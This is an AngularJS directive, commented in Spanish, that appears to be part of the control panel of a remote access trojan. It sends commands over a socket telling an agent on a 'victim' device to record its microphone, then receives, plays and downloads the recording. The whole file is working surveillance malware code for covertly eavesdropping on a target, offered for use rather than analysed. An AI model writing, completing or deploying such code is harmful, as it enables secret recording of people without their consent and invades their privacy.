angular.module('myappy').directive('labMic', function() {
  return {
    restrict: 'E',
    scope: {
      victim: '='
    },
    templateUrl: 'views/mic.html',
    controller: ['$scope', function($scope) {
      $scope.sec = 10;
      $scope.isAudio = true;
      $scope.audioUrl = "";

      console.log('labMic controller loaded');

      // Usa socket global, debe estar inicializado en tu app principal
      var socket = window.socket || io();

      $scope.Record = function(sec) {
        $scope.isAudio = true;
        // Ordena al backend grabar audio en el agente de la víctima
        socket.emit('mic-record', {
          victimId: $scope.victim.id,
          seconds: sec
        });
        if ($scope.addLog) $scope.addLog('Orden enviada para grabar audio en el dispositivo remoto.', 'blue');
      };

      // Recibe el audio grabado por el agente
      socket.on('mic-audio', function(data) {
        if (data.error) {
          alert("Error al recibir audio: " + data.error);
          $scope.isAudio = true;
          $scope.$applyAsync();
          return;
        }
        $scope.audioUrl = data.audioUrl;
        document.getElementById('sourceMp3').src = data.audioUrl;
        var player = document.getElementById('player');
        player.load();
        $scope.isAudio = false;
        $scope.$applyAsync();
        if ($scope.addLog) $scope.addLog('Audio recibido desde el dispositivo remoto.', 'green');
      });

      $scope.SaveAudio = function() {
        if (!$scope.audioUrl) return;
        var a = document.createElement('a');
        a.style.display = 'none';
        a.href = $scope.audioUrl;
        a.download = 'grabacion_victima.mp3';
        document.body.appendChild(a);
        a.click();
        document.body.removeChild(a);
      };
    }]
  };
});